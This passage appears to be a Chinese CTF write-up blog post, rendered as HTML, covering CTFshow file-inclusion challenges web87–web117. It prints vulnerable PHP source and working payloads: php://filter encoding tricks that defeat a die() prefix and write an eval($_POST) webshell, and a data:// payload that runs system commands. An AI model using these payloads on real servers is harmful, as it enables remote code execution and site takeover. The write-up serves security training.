die(&#x27;大佬别秀了&#x27;);?&gt;&quot;.$content);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>
+
+<p>写文件绕过限制直接用编码  因为前面有die，所以我们后面直接写php内容会起不到作用 所以还要我们要想办法绕过die &amp;#x20;</p>
+<p>写入文件</p>
+<p>明文payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/write=convert.base64-decode/resource=a.php</span><br></pre></td></tr></table></figure>
+
+<p>经过两次编码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%36%31%25%32%65%25%37%30%25%36%38%25%37%30</span><br></pre></td></tr></table></figure>
+
+<p>这个就能绕过写文件的限制了</p>
+<p>绕过die函数 这个我看wp师傅们是用base64绕过的 但是还是有些小细节</p>
+<p>明文payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval($_POST[1]);</span><br></pre></td></tr></table></figure>
+
+<p>base64</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAgZXZhbCgkX1BPU1RbMV0pOw==</span><br></pre></td></tr></table></figure>
+
+<p>这里绕过die函数 参考的是p神使用php:&#x2F;&#x2F;filter流的base64-decode方法</p>
+<p>原理很简单 <strong>利用base64解码，将死亡代码解码成乱码，使得php引擎无法识别</strong>；</p>
+<p>base64编码中只包含64个可打印字符 php编码再解码base64时 遇到不在其中的字符会跳过这些 只将合法字符组成一个新的字符串进行解码</p>
+<p>所以在base编码之前加上其它字符 base64在解码过程中将4个字节转化为3个字节 这就只有phpdie参与了解码 补上一位完全转化</p>
+<p>最终payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">11PD9waHAgZXZhbCgkX1BPU1RbMV0pOw==</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/10/14/CTFSHOW-web%E5%85%A5%E9%97%A8-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20221216144559114.png" alt="image-20221216144559114"></p>
+<p>执行 一句话木马成功写入a.php文件中 访问拿到flag</p>
+<h3 id="web88"><a href="#web88" class="headerlink" title="web88"></a>web88</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    if(preg_match(&quot;/php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i&quot;, $file))&#123;</span><br><span class="line">        die(&quot;error&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=system(&#x27;tac f*.php&#x27;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>编码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD89c3lzdGVtKCd0YWMgZioucGhwJyk7Cg==</span><br></pre></td></tr></table></figure>
+
+<p>用php data协议执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?file=data://text/plain;base64,PD89c3lzdGVtKCd0YWMgZioucGhwJyk7Cg==</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="web116"><a href="#web116" class="headerlink" title="web116"></a>web116</h3><p>打开是一个小视频，先下载下来，放在010里面检查一下，发现有png文件，拖出来之后发现是源码</p>
+<p><img src="/2022/10/14/CTFSHOW-web%E5%85%A5%E9%97%A8-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20221216144613578.png" alt="image-20221216144613578"></p>
+<p><img src="/2022/10/14/CTFSHOW-web%E5%85%A5%E9%97%A8-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20221216144700916.png" alt="image-20221216144700916"></p>
+<p>直接读文件</p>
+<p><img src="/2022/10/14/CTFSHOW-web%E5%85%A5%E9%97%A8-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20221216144649868.png" alt="image-20221216144649868"></p>
+<h3 id="web117"><a href="#web117" class="headerlink" title="web117"></a>web117</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">function filter($x)&#123;</span><br><span class="line">    if(preg_match(&#x27;/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i&#x27;,$x))&#123;</span><br><span class="line">        die(&#x27;too young too simple sometimes naive!&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$file=$_GET[&#x27;file&#x27;];</span><br><span class="line">$contents=$_POST[&#x27;contents&#x27;];</span><br><span class="line">filter($file);</span><br><span class="line">file_put_contents($file, &quot;&lt;?php die();?&gt;&quot;.$contents);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>绕过死亡die&amp;#x20;</p>
+<p>这是取一个 UCS-2LE UCS-2BE，这种是将字符两位两位进行交换</p>
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php</span><br><span class="line">post:contents=?&lt;hp pvela$(P_SO[T]1;)&gt;?</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/CTF%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" rel="tag"># CTF刷题笔记</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/10/10/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E4%B9%8B%E7%9B%AE%E5%BD%95%E7%B1%BB/" rel="prev" title="信息搜集之目录类">
+      <i class="fa fa-chevron-left"></i> 信息搜集之目录类
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2022/11/07/CTFSHOW-web%E5%85%A5%E9%97%A8-SSRF/" rel="next" title="CTFshow-web入门-ssrf">
+      CTFshow-web入门-ssrf <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#web78"><span class="nav-number">1.</span> <span class="nav-text">web78</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web79"><span class="nav-number">2.</span> <span class="nav-text">web79</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web80"><span class="nav-number">3.</span> <span class="nav-text">web80</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web81"><span class="nav-number">4.</span> <span class="nav-text">web81</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web82"><span class="nav-number">5.</span> <span class="nav-text">web82</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web83"><span class="nav-number">6.</span> <span class="nav-text">web83</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web84"><span class="nav-number">7.</span> <span class="nav-text">web84</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web85"><span class="nav-number">8.</span> <span class="nav-text">web85</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web86"><span class="nav-number">9.</span> <span class="nav-text">web86</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web87"><span class="nav-number">10.</span> <span class="nav-text">web87</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web88"><span class="nav-number">11.</span> <span class="nav-text">web88</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web116"><span class="nav-number">12.</span> <span class="nav-text">web116</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web117"><span class="nav-number">13.</span> <span class="nav-text">web117</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Lzer0Kx"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">Lzer0Kx</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">11</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/xiaobaiakai" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;xiaobaiakai" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Lzer0Kx</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
